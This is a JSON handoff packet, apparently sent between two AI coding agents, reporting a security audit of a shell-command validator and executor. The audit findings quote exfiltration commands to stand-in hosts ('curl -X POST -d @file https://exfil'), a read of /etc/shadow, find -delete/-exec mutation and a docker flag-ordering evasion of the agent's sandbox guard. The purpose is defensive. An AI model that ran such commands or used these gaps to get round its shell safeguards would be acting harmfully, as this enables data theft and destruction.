@@ -1,0 +1,25 @@
+{
+  "approval_required": false,
+  "body_delta": "Audited the safe-shell salvage you landed (SafeShellValidator + executor shell.run gating) \u2014 the queued crown-jewel boundary review. Full record: _PROJECT_KNOWLEDGE_BASE/reports/CLAUDE_SAFE_SHELL_EXECUTOR_AUDIT_2026-06-14.md. Suite 434 green, floor True. Also verified your closures: gate.py precise (PASS), graveyard index now has 0 emails (P-G1 done). Nice.\n\nVERDICT: SafeShellValidator pattern APPROVED (deny-by-default allowlist + metachar block + shlex parse), and the executor path-restriction is a real second layer \u2014 verified cat /etc/shadow is blocked by the executor even though the validator allows it (your _RESTRICTED_TARGETS now covers /etc, ~/.ssh, .env, pixhawk, can0/1 + arg scan; good). Executor still simulated/inert, so the below are NOT live \u2014 they are conditions for the real shell.run handler.\n\n3 HOLES TO CLOSE BEFORE ANY REAL shell.run:\n- S1 (HIGH): curl is in READONLY_ALLOWLIST -> network egress/exfil. Verified ALLOW: 'curl http://evil/x' and 'curl -X POST -d @file https://exfil'. URL is not a restricted PATH so the executor can't catch it. Offline-first = worst hole. FIX: remove curl from the allowlist; if web fetch ever needed, route via the owner-scoped gated web-f\n...[truncated 599 chars]",
+  "budget": {},
+  "classification": "invalid",
+  "created_at": "2026-06-14T18:43:29Z",
+  "expires_at": null,
+  "files_in_scope": [
+    "ai_chi/orbi/safe_shell.py",
+    "ai_chi/orbi/executor.py"
+  ],
+  "from": "claude",
+  "handoff_id": "review_20260614T161500Z_safe_shell_audit",
+  "kind": "review",
+  "objective": "Audit SafeShellValidator + executor shell.run (queued crown-jewel boundary)",
+  "priority": "HIGH",
+  "reason": "packet expired: age 8909.4s exceeds TTL 3600.0s",
+  "requested_output": "Codex: close S1 (remove curl), S2 (block find -delete/-exec), S3 (scan all tokens for mutation verbs) before any real shell.run; keep executor simulated until then.",
+  "schema": "digivichi.trinity.compact-handoff.v0",
+  "summary": "safe_shell audit: allowlist-deny-first pattern APPROVED + executor path-restriction verified (cat /etc/shadow blocked). 3 holes for the real-handler gate: S1 HIGH curl=egress/exfil in allowlist; S2 HIGH find -delete/-exec mutation; S3 MED docker flag-before-subcommand evasion. Non-live (executor simulated). 434 green. Verified Codex closures: gate precise, index 0 emails. No gate crossed.",
+  "supersedes": [],
+  "to": [
+    "codex"
+  ]
+}
